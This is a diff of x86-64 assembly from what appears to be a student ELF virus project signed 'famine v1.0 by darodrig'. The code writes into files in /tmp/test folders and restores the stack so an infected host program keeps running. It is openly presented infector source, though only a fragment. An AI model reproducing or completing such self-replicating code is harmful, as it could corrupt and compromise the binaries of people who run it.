@@ -257,10 +257,8 @@ _start:
                 mov r10, rax                                    ; mov rax to r10 = new target EOF
                 mov rax, SYS_PWRITE64
                 syscall
-
                 cmp rax, 0
                 jbe .close_file
-
                 mov rax, SYS_SYNC                               ; commiting filesystem caches to disk
                 syscall
 		.close_file:
@@ -273,37 +271,8 @@ _start:
 			add cx, word [rcx + r15 + 416]
 			cmp rcx, qword [r15 + 350]
 			jne for_each_file
-		jmp cleanup
-	; puts:
-	; 	call strlen
-	; 	mov rdx, rax		;strlen
-	; 	mov rsi, rdi		;buff
-	; 	mov rdi, 1			;fd
-	; 	mov rax, SYS_WRITE	;syscall
-	; 	syscall
-	; 	push 0xa
-	; 	mov rsi, rsp
-	; 	mov rdx, 1
-	; 	mov rdi, 1
-	; 	mov rax, SYS_WRITE
-	; 	syscall
-	; 	pop rsi
-	; 	ret
-	; strlen:
-	; 	xor rax, rax
-	; 	.loop:
-	; 		cmp byte [rdi + rax], 0
-	; 		je .end
-	; 		inc rax
-	; 		jmp strlen.loop
-	; 	.end:
-	; 		ret
-cleanup:
 
-    add rsp, 5000                                               ; restoring stack so host process can run normally, this also could use some improvement
-    ; pop rsp
-    ; pop rdx
-	jmp _end
+		jmp cleanup
 print_dot:
 	push rbx
 	mov rdi, 1
@@ -322,11 +291,21 @@ set_folder_chdir:
 set_folder2:
 	call chdir
 	db `/tmp/test2\0`
+famine:
+	db 'famine v1.0 by darodrig', 0
 err:
 	mov rax, SYS_EXIT
 	mov rdi, 0xfffffff
 	syscall
+cleanup:
+
+	mov rax, SYS_GETUID
+	syscall
+    add rsp, 5008                                               ; restoring stack so host process can run normally, this also could use some improvement
+    pop rsp
+    pop rdx
+	jmp _end
 _end:
-	mov rax, SYS_EXIT
 	xor rdi, rdi
+	mov rax, SYS_EXIT
 	syscall
